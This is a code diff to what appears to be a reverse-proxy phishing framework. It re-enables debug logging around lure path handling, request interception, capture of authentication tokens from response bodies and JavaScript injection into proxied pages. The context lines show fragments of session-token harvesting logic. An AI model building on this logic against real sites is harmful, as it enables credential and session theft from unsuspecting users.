@@ -612,7 +612,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if len(dname) > 0 {
 									path_add := true
 									if n < len(lure_path_parts) {
-										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
+										log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
 										if req_path_parts[n] == lure_path_parts[n] {
 											path_add = false
 										}
@@ -624,7 +624,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							}
 							rel_path := filepath.Join(rel_parts...)
-							//log.Debug("rel_path: %s", rel_path)
+							log.Debug("rel_path: %s", rel_path)
 
 							t_dir := s.RedirectorName
 							if !filepath.IsAbs(t_dir) {
@@ -636,9 +636,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if _, err := os.Stat(path); !os.IsNotExist(err) {
 								fdata, err := ioutil.ReadFile(path)
 								if err == nil {
-									//log.Debug("ext: %s", filepath.Ext(req_path))
+									log.Debug("ext: %s", filepath.Ext(req_path))
 									mime_type := getContentType(req_path, fdata)
-									//log.Debug("mime_type: %s", mime_type)
+									log.Debug("mime_type: %s", mime_type)
 									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
 									if resp != nil {
 										resp.Body = io.NopCloser(bytes.NewReader(fdata))
@@ -650,7 +650,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Error("lure: failed to read redirector data file: %s", err)
 								}
 							} else {
-								//log.Warning("lure: template file does not exist: %s", path)
+								log.Warning("lure: template file does not exist: %s", path)
 							}
 						}
 					}
@@ -684,8 +684,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 						for _, ic := range pl.intercept {
-							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
-							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+							log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+							log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
 							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
 								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
 							}
@@ -1174,9 +1174,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					// capture body response tokens
 					for k, v := range pl.bodyAuthTokens {
 						if _, ok := s.BodyTokens[k]; !ok {
-							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+							log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-								//log.Debug("RESPONSE body = %s", string(body))
+								log.Debug("RESPONSE body = %s", string(body))
 								token_re := v.search.FindStringSubmatch(string(body))
 								if token_re != nil && len(token_re) >= 2 {
 									s.BodyTokens[k] = token_re[1]
@@ -1332,7 +1332,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}*/
 								js_params = &s.Params
 							}
-							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+							log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
 								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
